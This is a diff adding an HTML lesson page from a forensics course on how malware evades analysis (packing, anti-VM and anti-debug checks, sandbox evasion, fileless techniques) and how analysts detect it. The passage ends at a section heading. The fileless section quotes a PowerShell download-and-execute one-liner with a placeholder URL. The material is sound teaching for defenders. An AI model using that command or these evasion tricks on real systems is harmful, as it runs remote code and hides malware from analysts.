@@ -1,0 +1,916 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 13.4 – Evasion and Integration: Anti-Analysis Techniques and Connecting Malware to the Broader Investigation</title>
+<style>
+:root {
+--primary: #1a5276;
+--primary-light: #2980b9;
+--primary-dark: #0e2f44;
+--accent: #e67e22;
+--accent-light: #f39c12;
+--bg: #ffffff;
+--bg-light: #f8f9fa;
+--bg-code: #f4f6f8;
+--text: #2c3e50;
+--text-light: #566573;
+--border: #d5dbdb;
+--success: #27ae60;
+--success-bg: #eafaf1;
+--danger: #c0392b;
+--danger-bg: #fdedec;
+--warning: #f39c12;
+--warning-bg: #fef9e7;
+--info: #2980b9;
+--info-bg: #eaf2f8;
+--purple: #8e44ad;
+--purple-bg: #f4ecf7;
+--teal: #17a589;
+--teal-bg: #e8f8f5;
+--shadow: 0 2px 8px rgba(0,0,0,0.08);
+--radius: 8px;
+--nav-height: 56px;
+}
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0;}
+html{scroll-behavior:smooth;scroll-padding-top:calc(var(--nav-height) + 16px);}
+body{font-family:'Segoe UI',Roboto,Helvetica,Arial,sans-serif;font-size:1rem;line-height:1.7;color:var(--text);background:var(--bg);}
+
+/* ---------- SKIP LINK ---------- */
+.skip-link{position:absolute;top:-100%;left:8px;background:var(--primary);color:#fff;padding:8px 16px;z-index:1000;border-radius:0 0 var(--radius) var(--radius);font-weight:600;text-decoration:none;}
+.skip-link:focus{top:0;}
+
+/* ---------- NAV BAR ---------- */
+.top-nav{position:sticky;top:0;z-index:900;background:var(--primary-dark);padding:0 24px;display:flex;align-items:center;height:var(--nav-height);overflow-x:auto;gap:4px;box-shadow:0 2px 6px rgba(0,0,0,.25);}
+.top-nav a{color:#fff;text-decoration:none;font-size:.82rem;padding:6px 12px;border-radius:var(--radius);white-space:nowrap;transition:background .2s;}
+.top-nav a:hover,.top-nav a:focus{background:rgba(255,255,255,.15);outline:none;}
+.top-nav a:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+
+/* ---------- LAYOUT ---------- */
+.page-wrap{max-width:960px;margin:0 auto;padding:24px 20px 64px;}
+header.hero{background:linear-gradient(135deg,var(--primary),var(--primary-light));color:#fff;padding:40px 32px;border-radius:var(--radius);margin-bottom:32px;box-shadow:var(--shadow);}
+header.hero .overline{font-size:.8rem;text-transform:uppercase;letter-spacing:2px;opacity:.85;display:block;margin-bottom:4px;}
+header.hero h1{font-size:1.65rem;margin-bottom:8px;line-height:1.3;}
+header.hero .subtitle{font-size:1.05rem;opacity:.92;line-height:1.5;}
+header.hero .meta{margin-top:14px;font-size:.85rem;opacity:.78;display:flex;flex-wrap:wrap;gap:18px;}
+
+section{margin-bottom:40px;}
+section h2{font-size:1.35rem;color:var(--primary);border-bottom:3px solid var(--accent);padding-bottom:6px;margin-bottom:18px;}
+section h3{font-size:1.1rem;color:var(--primary-dark);margin:22px 0 10px;}
+section h4{font-size:1rem;color:var(--text);font-weight:600;margin:16px 0 8px;}
+p{margin-bottom:14px;}
+ul,ol{margin:0 0 14px 24px;}
+li{margin-bottom:6px;}
+strong{color:var(--primary-dark);}
+code{background:var(--bg-code);padding:2px 6px;border-radius:4px;font-size:.92em;font-family:'Cascadia Code','Fira Code','Consolas',monospace;}
+
+/* ---------- CALLOUT BOXES ---------- */
+.callout{border-left:4px solid var(--info);background:var(--info-bg);padding:16px 20px;border-radius:0 var(--radius) var(--radius) 0;margin:18px 0;font-size:.95rem;}
+.callout.forensic-note{border-color:var(--primary);background:#eaf2f8;}
+.callout.warning{border-color:var(--danger);background:var(--danger-bg);}
+.callout.tip{border-color:var(--success);background:var(--success-bg);}
+.callout.scenario{border-color:var(--accent);background:var(--warning-bg);}
+.callout.connection{border-color:var(--purple);background:var(--purple-bg);}
+.callout.integration{border-color:var(--teal);background:var(--teal-bg);}
+.callout .callout-title{font-weight:700;margin-bottom:6px;display:flex;align-items:center;gap:6px;}
+.callout .callout-title .icon{font-size:1.15em;}
+
+/* ---------- TABLES ---------- */
+.table-wrap{overflow-x:auto;margin:16px 0 20px;}
+table{width:100%;border-collapse:collapse;font-size:.93rem;}
+th,td{border:1px solid var(--border);padding:10px 14px;text-align:left;vertical-align:top;}
+th{background:var(--primary);color:#fff;font-weight:600;white-space:nowrap;}
+tr:nth-child(even){background:var(--bg-light);}
+
+/* ---------- INTERACTIVE ELEMENTS ---------- */
+.accordion{margin:14px 0;}
+.accordion-btn{width:100%;text-align:left;background:var(--bg-light);border:1px solid var(--border);padding:14px 18px;font-size:1rem;font-weight:600;color:var(--primary-dark);cursor:pointer;border-radius:var(--radius);display:flex;justify-content:space-between;align-items:center;transition:background .2s;}
+.accordion-btn:hover,.accordion-btn:focus{background:#e8eff5;outline:none;}
+.accordion-btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+.accordion-btn .arrow{transition:transform .3s;font-size:1.1rem;}
+.accordion-btn[aria-expanded="true"] .arrow{transform:rotate(180deg);}
+.accordion-panel{max-height:0;overflow:hidden;transition:max-height .35s ease;border:1px solid var(--border);border-top:none;border-radius:0 0 var(--radius) var(--radius);background:#fff;}
+.accordion-panel .panel-inner{padding:18px 20px;}
+
+/* ---------- KNOWLEDGE CHECK ---------- */
+.kc-question{background:var(--bg-light);border:1px solid var(--border);border-radius:var(--radius);padding:20px;margin:14px 0;}
+.kc-question p.q-stem{font-weight:600;margin-bottom:12px;}
+.kc-options{list-style:none;margin:0 0 12px;padding:0;}
+.kc-options li{margin-bottom:6px;}
+.kc-options label{cursor:pointer;display:flex;align-items:flex-start;gap:8px;padding:6px 8px;border-radius:4px;transition:background .15s;}
+.kc-options label:hover{background:#e8eff5;}
+.kc-options input[type="radio"]{margin-top:4px;accent-color:var(--primary);}
+.kc-feedback{display:none;padding:14px 18px;border-radius:var(--radius);margin-top:8px;font-size:.93rem;line-height:1.6;}
+.kc-feedback.correct{background:var(--success-bg);border-left:4px solid var(--success);}
+.kc-feedback.incorrect{background:var(--danger-bg);border-left:4px solid var(--danger);}
+.kc-feedback.neutral{background:var(--info-bg);border-left:4px solid var(--info);}
+.btn{display:inline-block;padding:10px 22px;background:var(--primary);color:#fff;border:none;border-radius:var(--radius);font-size:.95rem;font-weight:600;cursor:pointer;transition:background .2s;}
+.btn:hover,.btn:focus{background:var(--primary-light);}
+.btn:focus-visible{outline:2px solid var(--accent);outline-offset:2px;}
+.btn:disabled{opacity:.5;cursor:not-allowed;}
+
+/* ---------- EVIDENCE MAP VISUAL ---------- */
+.evidence-map{background:var(--bg-light);border:2px solid var(--primary-light);border-radius:var(--radius);padding:24px;margin:20px 0;text-align:center;}
+.evidence-map .map-center{display:inline-block;background:var(--primary);color:#fff;padding:12px 24px;border-radius:var(--radius);font-weight:700;font-size:1.05rem;margin-bottom:16px;}
+.map-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:12px;margin-top:12px;}
+.map-card{background:#fff;border:2px solid var(--primary-light);border-radius:var(--radius);padding:14px 12px;text-align:center;font-size:.88rem;line-height:1.45;box-shadow:var(--shadow);transition:transform .2s,border-color .2s;}
+.map-card:hover{transform:translateY(-2px);border-color:var(--accent);}
+.map-card .card-week{font-weight:700;color:var(--primary);display:block;margin-bottom:4px;font-size:.82rem;text-transform:uppercase;letter-spacing:1px;}
+.map-card .card-title{font-weight:600;display:block;margin-bottom:4px;}
+.map-card .card-detail{color:var(--text-light);font-size:.82rem;}
+
+/* ---------- SCENARIO EXERCISE ---------- */
+.scenario-exercise{background:var(--warning-bg);border:2px solid var(--accent);border-radius:var(--radius);padding:22px;margin:20px 0;}
+.scenario-exercise h4{color:var(--accent);margin-bottom:10px;}
+
+/* ---------- CHECKLIST ---------- */
+.checklist{list-style:none;margin:12px 0;padding:0;}
+.checklist li{padding:6px 0 6px 28px;position:relative;}
+.checklist li::before{content:"✓";position:absolute;left:4px;color:var(--success);font-weight:700;}
+
+/* ---------- FOOTER ---------- */
+footer{text-align:center;padding:24px;font-size:.82rem;color:var(--text-light);border-top:1px solid var(--border);margin-top:40px;}
+
+/* ---------- RESPONSIVE ---------- */
+@media(max-width:600px){
+header.hero{padding:28px 18px;}
+header.hero h1{font-size:1.3rem;}
+.page-wrap{padding:16px 12px 48px;}
+.top-nav{padding:0 10px;}
+.top-nav a{font-size:.75rem;padding:6px 8px;}
+.map-grid{grid-template-columns:1fr 1fr;}
+}
+</style>
+</head>
+<body>
+
+<!-- Skip Link -->
+<a href="#main-content" class="skip-link">Skip to main content</a>
+
+<!-- Navigation -->
+<nav class="top-nav" aria-label="Module sections">
+<a href="#scenario">Scenario</a>
+<a href="#packers">Packers &amp; Obfuscation</a>
+<a href="#anti-vm">Anti-VM</a>
+<a href="#anti-debug">Anti-Debug &amp; Evasion</a>
+<a href="#integration">Cross-Domain Integration</a>
+<a href="#case-study">Case Study</a>
+<a href="#knowledge-check">Knowledge Check</a>
+</nav>
+
+<!-- Main Content -->
+<main id="main-content" class="page-wrap">
+
+<!-- HERO HEADER -->
+<header class="hero">
+<span class="overline">Week 13 &bull; Module 4 of 4</span>
+<h1>Evasion and Integration: Anti-Analysis Techniques and Connecting Malware to the Broader Investigation</h1>
+<p class="subtitle">Malware authors fight back against analysis — and forensic examiners fight smarter. This module explores how adversaries hide their tools, and how you connect malware findings to every evidence domain you have studied so far.</p>
+<div class="meta">
+<span>⏱ Est. Time: 1.5 – 2.0 hours</span>
+<span>📖 Objectives 5 &amp; 6</span>
+<span>🔗 Supports Lab 12</span>
+</div>
+</header>
+
+<!-- LEARNING OBJECTIVES -->
+<section aria-labelledby="obj-heading">
+<h2 id="obj-heading">Module Learning Objectives</h2>
+<p>After completing this module you will be able to:</p>
+<ol>
+<li><strong>Recognize common anti-analysis techniques</strong> used by malware authors, including packers, obfuscation, anti-VM checks, and anti-debugging, and describe how analysts detect and overcome them. <em>(Week 13 Objective 5)</em></li>
+<li><strong>Connect malware analysis findings to prior forensic domains</strong>, correlating malware artifacts with memory forensics (Week 11), network forensics (Week 12), and OS-level persistence (Weeks 7–9). <em>(Week 13 Objective 6)</em></li>
+</ol>
+<div class="callout connection">
+<div class="callout-title"><span class="icon">🔗</span> Building on Prior Modules</div>
+This module assumes you have completed Modules 13.1 (malware types and workflow), 13.2 (static analysis), and 13.3 (dynamic analysis and IOC extraction). Concepts such as PE headers, section entropy, import tables, string extraction with <code>strings</code> and FLOSS, sandbox behavioral monitoring, and IOC documentation are referenced throughout. If any of those topics feel unfamiliar, revisit the relevant module before continuing.
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 1: SCENARIO CONCLUSION -->
+<!-- ============================================================ -->
+<section id="scenario" aria-labelledby="scenario-heading">
+<h2 id="scenario-heading">1. Scenario Conclusion — The Second Variant</h2>
+
+<div class="callout scenario">
+<div class="callout-title"><span class="icon">🔍</span> Continuing Investigation — Apex Systems Breach</div>
+<p>Your analysis of <code>svchost_update.exe</code> is nearly complete. Static analysis (Module 13.2) revealed readable C2 domains, suspicious imports, and a clear PE structure. Dynamic analysis (Module 13.3) confirmed registry persistence, DNS look-ups to <code>evil-update.example.com</code>, and data exfiltration over HTTPS.</p>
+<p>But there is a complication. A second sample — <code>svchost_update_v2.exe</code> — has been recovered from a different workstation. Initial triage shows:</p>
+<ul style="margin-top:8px;">
+<li>The <strong>SHA-256 hash does not match</strong> the first sample.</li>
+<li><code>strings</code> returns <strong>almost nothing readable</strong> — no domains, no registry paths, no error messages.</li>
+<li>PE section entropy is <strong>7.6 out of 8.0</strong> across all major sections.</li>
+<li>The import table contains <strong>only two functions</strong>: <code>LoadLibraryA</code> and <code>GetProcAddress</code>.</li>
+<li>One PE section is named <strong><code>UPX0</code></strong>.</li>
+</ul>
+<p style="margin-top:10px;font-weight:600;">The malware author anticipated your analysis. How do you proceed?</p>
+</div>
+
+<p>Every indicator above points to the same conclusion: <strong>this sample is packed</strong>. The malware author has compressed or encrypted the real executable code so that static analysis sees only the unpacking stub. This is your introduction to <em>anti-analysis techniques</em> — deliberate countermeasures designed to delay, confuse, or prevent forensic examination.</p>
+
+<div class="callout forensic-note">
+<div class="callout-title"><span class="icon">⚖️</span> Forensic Significance</div>
+The <em>presence</em> of anti-analysis techniques is itself a forensic finding. Legitimate software rarely needs to detect virtual machines, evade debuggers, or encrypt its own code. Documenting these techniques strengthens the argument that a file is malicious and demonstrates attacker sophistication.
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 2: PACKERS AND OBFUSCATION -->
+<!-- ============================================================ -->
+<section id="packers" aria-labelledby="packers-heading">
+<h2 id="packers-heading">2. Packers and Obfuscation</h2>
+
+<h3>2.1 What Is Packing?</h3>
+<p>A <strong>packer</strong> is a tool that compresses or encrypts an executable file. The packed file contains a small <em>unpacking stub</em> — a piece of code that runs first, restores the original executable in memory, and then transfers execution to it. From the analyst's perspective:</p>
+<ul>
+<li><strong>Static analysis is defeated</strong> — the real code, strings, and imports are hidden inside the compressed or encrypted payload.</li>
+<li><strong>Dynamic analysis still works</strong> — once the sample runs, the unpacking stub restores the original code in memory, where behavioral monitoring can observe it.</li>
+<li><strong>File hashes change</strong> — repacking the same malware produces a different hash each time, evading hash-based detection.</li>
+</ul>
+
+<h3>2.2 Packer Detection Indicators</h3>
+<p>You already have the skills to detect packing from Module 13.2's static analysis techniques. Here is a consolidated detection checklist:</p>
+
+<div class="callout tip">
+<div class="callout-title"><span class="icon">📋</span> Packer Detection Checklist</div>
+<ul class="checklist">
+<li><strong>High section entropy</strong> — values above 7.0 (on a 0–8 scale) in <code>.text</code> or other code sections indicate compression or encryption. Normal compiled code typically has entropy between 5.0 and 6.5.</li>
+<li><strong>Unusual section names</strong> — names like <code>UPX0</code>, <code>UPX1</code>, <code>.themida</code>, <code>.vmp0</code> are signatures of specific packers.</li>
+<li><strong>Minimal import table</strong> — a packed binary often imports only <code>LoadLibraryA</code> and <code>GetProcAddress</code>, which it uses at runtime to dynamically resolve every other API call.</li>
+<li><strong>Small import table relative to file size</strong> — a 2 MB executable with only 3 imports is suspicious.</li>
+<li><strong>Very few readable strings</strong> — the <code>strings</code> command returns almost nothing useful; FLOSS (from Module 13.2) may recover some obfuscated strings but not all.</li>
+<li><strong>Large difference between file size on disk and virtual size in PE headers</strong> — the unpacked code will be larger than the packed payload.</li>
+</ul>
+</div>
+
+<h3>2.3 Common Packers</h3>
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Packer</th><th>Characteristics</th><th>Analyst Notes</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>UPX</strong><br>(Ultimate Packer for eXecutables)</td>
+<td>Open-source; compresses but does not encrypt; section names <code>UPX0</code>/<code>UPX1</code>; very common</td>
+<td>Trivially unpacked with <code>upx -d packed.exe</code>. If UPX unpacking succeeds, repeat static analysis on the unpacked binary.</td>
+</tr>
+<tr>
+<td><strong>Themida</strong></td>
+<td>Commercial protector; virtualizes code sections; strong anti-debugging; section name <code>.themida</code></td>
+<td>Significantly harder to unpack. Analysts typically rely on dynamic analysis or memory dumping after the unpacking stub runs.</td>
+</tr>
+<tr>
+<td><strong>VMProtect</strong></td>
+<td>Converts code to custom bytecode executed by an embedded virtual machine; sections <code>.vmp0</code>/<code>.vmp1</code></td>
+<td>Extremely difficult to reverse statically. Dynamic analysis and memory forensics (dumping the process after unpacking) are the primary approaches.</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div class="callout connection">
+<div class="callout-title"><span class="icon">🔗</span> Connection to Module 13.2</div>
+In Module 13.2 you learned to use FLOSS (FireEye Labs Obfuscated String Solver) to recover obfuscated and stack strings that the basic <code>strings</code> command misses. FLOSS is especially valuable against lightly packed or string-obfuscated samples. For heavily packed samples (Themida, VMProtect), even FLOSS may not recover meaningful strings until the sample is unpacked.
+</div>
+
+<h3>2.4 Obfuscation Techniques</h3>
+<p>Obfuscation refers to techniques that make code or data harder to understand <em>without necessarily compressing or encrypting the entire binary</em>. Obfuscation and packing are often used together.</p>
+
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Technique</th><th>What It Does</th><th>Detection Approach</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>String obfuscation</strong></td>
+<td>Encodes strings with XOR, Base64, or custom algorithms so they are not visible to <code>strings</code></td>
+<td>FLOSS; dynamic analysis (strings appear in memory at runtime)</td>
+</tr>
+<tr>
+<td><strong>Control flow obfuscation</strong></td>
+<td>Inserts junk jumps, opaque predicates, and spaghetti code to confuse disassemblers</td>
+<td>Beyond this course's scope (requires reverse engineering); noted for awareness</td>
+</tr>
+<tr>
+<td><strong>Dead code insertion</strong></td>
+<td>Adds non-functional instructions to inflate the binary and alter its hash</td>
+<td>Fuzzy hashing (<code>ssdeep</code> from Module 13.2) can still identify similarity between variants</td>
+</tr>
+<tr>
+<td><strong>API obfuscation</strong></td>
+<td>Resolves API calls at runtime via hashed function names instead of listing them in the import table</td>
+<td>Minimal import table is the static indicator; dynamic analysis reveals the actual API calls</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<!-- Interactive: Packer Detection Exercise -->
+<div class="accordion" id="acc-packer">
+<button class="accordion-btn" aria-expanded="false" aria-controls="panel-packer" id="btn-packer">
+<span>🧪 Interactive Exercise — Can You Spot the Packed Sample?</span>
+<span class="arrow" aria-hidden="true">▼</span>
+</button>
+<div class="accordion-panel" id="panel-packer" role="region" aria-labelledby="btn-packer">
+<div class="panel-inner">
+<p>You are triaging three suspicious executables. Based on the static indicators below, identify which sample is most likely packed and explain your reasoning.</p>
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Indicator</th><th>Sample A</th><th>Sample B</th><th>Sample C</th></tr>
+</thead>
+<tbody>
+<tr><td>File size</td><td>1.8 MB</td><td>340 KB</td><td>2.1 MB</td></tr>
+<tr><td>.text section entropy</td><td>5.8</td><td>7.7</td><td>6.1</td></tr>
+<tr><td>Section names</td><td>.text, .data, .rsrc</td><td>UPX0, UPX1, .rsrc</td><td>.text, .rdata, .data</td></tr>
+<tr><td>Number of imports</td><td>47</td><td>3</td><td>112</td></tr>
+<tr><td>Readable strings</td><td>~320</td><td>~12</td><td>~580</td></tr>
+</tbody>
+</table>
+</div>
+<div class="callout tip" style="margin-top:14px;">
+<div class="callout-title"><span class="icon">✅</span> Answer</div>
+<p><strong>Sample B</strong> is almost certainly packed — likely with UPX. Every indicator aligns:</p>
+<ul>
+<li>Section entropy of 7.7 (well above the 7.0 threshold)</li>
+<li>Section names <code>UPX0</code> and <code>UPX1</code> are the UPX packer's signature</li>
+<li>Only 3 imports (likely <code>LoadLibraryA</code>, <code>GetProcAddress</code>, and one other)</li>
+<li>Almost no readable strings (12 vs. hundreds for the other samples)</li>
+</ul>
+<p><strong>Next step:</strong> Attempt <code>upx -d sample_b.exe</code> to unpack, then repeat full static analysis on the result.</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 3: ANTI-VM TECHNIQUES -->
+<!-- ============================================================ -->
+<section id="anti-vm" aria-labelledby="antivm-heading">
+<h2 id="antivm-heading">3. Anti-Virtual-Machine Techniques</h2>
+
+<p>Malware analysts almost always run samples inside virtual machines for safety. Malware authors know this — so they build <strong>VM detection checks</strong> into their code. If the malware determines it is running in a VM, it may:</p>
+<ul>
+<li><strong>Exit immediately</strong> without performing any malicious behavior</li>
+<li><strong>Enter an infinite sleep loop</strong> to waste analyst time</li>
+<li><strong>Execute benign behavior only</strong> (e.g., act like a calculator) to generate a clean sandbox report</li>
+<li><strong>Delete itself</strong> to prevent further analysis</li>
+</ul>
+
+<h3>3.1 Common Anti-VM Detection Methods</h3>
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Detection Method</th><th>What the Malware Checks</th><th>Example Indicator</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Registry keys</strong></td>
+<td>VM-specific registry entries left by guest tools</td>
+<td><code>HKLM\SOFTWARE\VMware, Inc.\VMware Tools</code><br><code>HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions</code></td>
+</tr>
+<tr>
+<td><strong>Process names</strong></td>
+<td>VM guest tool processes running on the system</td>
+<td><code>vmtoolsd.exe</code>, <code>VBoxService.exe</code>, <code>VBoxTray.exe</code></td>
+</tr>
+<tr>
+<td><strong>MAC address prefixes</strong></td>
+<td>Network adapter manufacturer OUI assigned to VM vendors</td>
+<td>VMware: <code>00:0C:29</code>, <code>00:50:56</code><br>VirtualBox: <code>08:00:27</code></td>
+</tr>
+<tr>
+<td><strong>Hardware identifiers</strong></td>
+<td>BIOS vendor strings, disk model names, video adapter names</td>
+<td>BIOS containing "VBOX", disk model "VBOX HARDDISK", video adapter "VMware SVGA"</td>
+</tr>
+<tr>
+<td><strong>Timing checks</strong></td>
+<td>Certain CPU instructions (e.g., <code>RDTSC</code>, <code>CPUID</code>) execute measurably faster or slower in a VM</td>
+<td>Malware runs the instruction twice and compares elapsed ticks; large discrepancy → VM detected</td>
+</tr>
+<tr>
+<td><strong>Resource checks</strong></td>
+<td>Analysis VMs often have low RAM, few CPU cores, and small disks</td>
+<td>Malware checks: RAM &lt; 4 GB? CPU cores &lt; 2? Disk &lt; 80 GB? → Likely a VM</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<h3>3.2 Analyst Countermeasures</h3>
+<p>Analysts can modify their analysis VMs to reduce the number of detectable VM artifacts:</p>
+<ul>
+<li><strong>Remove or rename VM guest tools</strong> — uninstall VMware Tools or VirtualBox Guest Additions before analysis (accept reduced VM functionality).</li>
+<li><strong>Change the MAC address</strong> — assign a MAC address with a non-VM OUI prefix.</li>
+<li><strong>Edit registry keys</strong> — remove or rename VM-specific registry entries.</li>
+<li><strong>Increase VM resources</strong> — allocate at least 4 GB RAM, 2+ CPU cores, and a realistically sized virtual disk.</li>
+<li><strong>Modify BIOS/hardware strings</strong> — some hypervisors allow customizing BIOS vendor strings.</li>
+<li><strong>Use bare-metal analysis systems</strong> — for high-priority samples that defeat all VM countermeasures, analysts may use dedicated physical machines (advanced technique).</li>
+</ul>
+
+<div class="callout forensic-note">
+<div class="callout-title"><span class="icon">⚖️</span> Forensic Significance of VM Detection</div>
+<p>If you observe a sample that <strong>exits immediately</strong> or <strong>behaves benignly</strong> in your analysis VM but was clearly causing damage on the victim's physical machine, anti-VM behavior is the likely explanation. Document this finding — it demonstrates attacker sophistication and may explain discrepancies between your sandbox results and the victim's experience.</p>
+</div>
+
+<!-- Interactive: Anti-VM Diagnosis Scenario -->
+<div class="scenario-exercise">
+<h4>🧪 Scenario Exercise — Why Did the Malware Exit?</h4>
+<p>You are analyzing <code>update_service.exe</code> in your VirtualBox analysis VM. You take a snapshot, disable networking, and double-click the sample. Process Monitor shows the process start, make three registry queries, and then exit after 0.4 seconds — no file system changes, no network attempts, no persistence.</p>
+<p>The three registry queries were:</p>
+<ol>
+<li><code>HKLM\SOFTWARE\Oracle\VirtualBox Guest Additions</code> — <strong>SUCCESS</strong></li>
+<li><code>HKLM\HARDWARE\ACPI\DSDT\VBOX__</code> — <strong>SUCCESS</strong></li>
+<li><code>HKLM\SYSTEM\CurrentControlSet\Enum\IDE</code> — returned "VBOX HARDDISK"</li>
+</ol>
+<p style="margin-top:10px;"><strong>Questions to consider:</strong></p>
+<ul>
+<li>What behavior is the malware exhibiting?</li>
+<li>What specific VM indicators did it detect?</li>
+<li>What three countermeasures could you apply before retrying the analysis?</li>
+</ul>
+<div class="accordion" id="acc-vm-answer">
+<button class="accordion-btn" aria-expanded="false" aria-controls="panel-vm-answer" id="btn-vm-answer">
+<span>Reveal Analysis</span>
+<span class="arrow" aria-hidden="true">▼</span>
+</button>
+<div class="accordion-panel" id="panel-vm-answer" role="region" aria-labelledby="btn-vm-answer">
+<div class="panel-inner">
+<p><strong>Behavior:</strong> Anti-VM detection. The malware queried three different VM indicators, all returned positive results for VirtualBox, and the malware exited without executing its payload.</p>
+<p><strong>Indicators detected:</strong></p>
+<ul>
+<li>VirtualBox Guest Additions registry key</li>
+<li>VirtualBox ACPI table identifier (<code>VBOX__</code>)</li>
+<li>VirtualBox hard disk model string</li>
+</ul>
+<p><strong>Countermeasures:</strong></p>
+<ol>
+<li>Uninstall VirtualBox Guest Additions and remove the associated registry keys.</li>
+<li>Modify the VM's ACPI table identifier (VBoxManage command-line configuration).</li>
+<li>Change the virtual disk controller model string to a realistic value (e.g., "Samsung SSD 870").</li>
+</ol>
+<p>After applying these changes, take a fresh snapshot and re-execute the sample. If it still exits, check for additional detection vectors (MAC address, timing checks, process enumeration).</p>
+</div>
+</div>
+</div>
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 4: ANTI-DEBUGGING AND OTHER EVASION -->
+<!-- ============================================================ -->
+<section id="anti-debug" aria-labelledby="antidebug-heading">
+<h2 id="antidebug-heading">4. Anti-Debugging and Other Evasion Techniques</h2>
+
+<div class="callout">
+<div class="callout-title"><span class="icon">📌</span> Scope Note</div>
+Anti-debugging and the additional evasion techniques in this section are covered at a <strong>conceptual awareness</strong> level. You do not need to implement countermeasures for these techniques in this course, but you should be able to recognize them in static analysis indicators (import tables) and understand their purpose.
+</div>
+
+<h3>4.1 Anti-Debugging Techniques</h3>
+<p>Debuggers allow analysts to step through malware instruction by instruction. Malware authors use several methods to detect or disrupt debugging:</p>
+
+<div class="table-wrap">
+<table>
+<thead>
+<tr><th>Technique</th><th>How It Works</th><th>Static Analysis Indicator</th></tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>API-based detection</strong></td>
+<td>Calls <code>IsDebuggerPresent</code> or <code>CheckRemoteDebuggerPresent</code> — Windows APIs that return <code>TRUE</code> if a debugger is attached</td>
+<td>These function names appear in the <strong>import table</strong> (visible during PE analysis in Module 13.2)</td>
+</tr>
+<tr>
+<td><strong>Timing checks</strong></td>
+<td>Measures time between two instructions using <code>RDTSC</code> or <code>GetTickCount</code>; stepping in a debugger introduces measurable delay</td>
+<td><code>GetTickCount</code> or <code>QueryPerformanceCounter</code> in the import table</td>
+</tr>
+<tr>
+<td><strong>Exception-based detection</strong></td>
+<td>Triggers a deliberate exception; a debugger handles it differently than the OS, revealing its presence</td>
+<td>Harder to detect statically; noted for awareness</td>
+</tr>
+</tbody>
+</table>
+</div>
+
+<div class="callout connection">
+<div class="callout-title"><span class="icon">🔗</span> Connection to Module 13.2 — Import Table Analysis</div>
+In Module 13.2, you learned that the import table reveals what OS functions an executable calls. The table in Section 2.4 of that module listed <code>IsDebuggerPresent</code> and <code>CheckRemoteDebuggerPresent</code> under the "Anti-debug" category. Now you understand <em>why</em> those imports are significant — they are the malware checking whether an analyst is watching.
+</div>
+
+<h3>4.2 Other Evasion Techniques</h3>
+
+<h4>Environment Checks</h4>
+<p>Beyond VM and debugger detection, malware may check for other signs of an analysis environment:</p>
+<ul>
+<li><strong>Username checks</strong> — exits if the username is "analyst", "malware", "sandbox", or "admin"</li>
+<li><strong>Computer name checks</strong> — exits if the hostname matches known sandbox naming patterns</li>
+<li><strong>File/folder checks</strong> — looks for analysis tools (Wireshark, Process Monitor, IDA Pro) in common installation paths</li>
+<li><strong>Mouse movement / user interaction</strong> — waits for realistic mouse clicks or keyboard input before executing (automated sandboxes often have no user interaction)</li>
+</ul>
+
+<h4>Delayed Execution</h4>
+<p>Many automated sandboxes run a sample for only 2–5 minutes before generating a report. Malware can evade this by:</p>
+<ul>
+<li>Calling <code>Sleep(600000)</code> — sleeping for 10 minutes before activating</li>
+<li>Setting a scheduled task to execute the payload hours or days later</li>
+<li>Waiting for a system reboot before activating</li>
+</ul>
+
+<h4>Geofencing</h4>
+<p>Some malware only activates in specific geographic regions:</p>
+<ul>
+<li>Checks the system <strong>locale and language settings</strong> (e.g., only runs if the system language is English)</li>
+<li>Queries an external service for the system's <strong>public IP address</strong> and compares it against target country IP ranges</li>
+<li>Checks the <strong>keyboard layout</strong> — some malware families famously avoid systems with Russian or CIS-country keyboard layouts</li>
+</ul>
+
+<h4>Fileless Techniques</h4>
+<p>Fileless malware avoids writing a traditional executable to disk entirely, operating instead through:</p>
+<ul>
+<li><strong>PowerShell</strong> — downloads and executes code directly in memory: <code>IEX (New-Object Net.WebClient).DownloadString('http://...')</code></li>
+<li><strong>WMI (Windows Management Instrumentation)</strong> — event subscriptions that trigger script execution</li>
+<li><strong>.NET reflection</strong> — loading assemblies directly into memory without touching the file system</li>
+</ul>
+
+<div class="callout connection">
+<div class="callout-title"><span class="icon">🔗</span> Connections to Prior Weeks</div>
+<ul>
+<li><strong>Week 11 (Memory Forensics):</strong> Fileless malware lives in memory — Volatility's <code>malfind</code> and <code>cmdline</code> plugins are critical for detecting it, since there is no file on disk to analyze.</li>
+<li><strong>Week 8 (Windows Forensics II):</strong> PowerShell ScriptBlock Logging (Event ID 4104) can capture the full text of PowerShell commands, even those executed entirely in memory. This is one of the most valuable defenses against fileless techniques.</li>
+<li><strong>Module 13.1:</strong> Fileless malware was introduced as a malware type. Now you understand <em>why</em> attackers choose fileless methods — they evade both file-based static analysis and many traditional antivirus products.</li>
+</ul>
+</div>
+</section>
+
+<!-- ============================================================ -->
+<!-- SECTION 5: CROSS-DOMAIN INTEGRATION -->
+<!-- ============================================================ -->
+<section id="integration" aria-labelledby="integration-heading">
+<h2 id="integration-heading">5. Connecting Malware Analysis to the Broader Investigation</h2>
+
+<p>Malware analysis does not exist in isolation. The findings from static and dynamic analysis become <em>far more powerful</em> when correlated with evidence from every forensic domain you have studied since Week 5. This section teaches you to build those connections — a skill you will apply in Lab 12's cross-domain correlation requirement and again in the Week 17 Final Project.</p>
+
+<h3>5.1 Five Key Questions Malware Analysis Answers</h3>
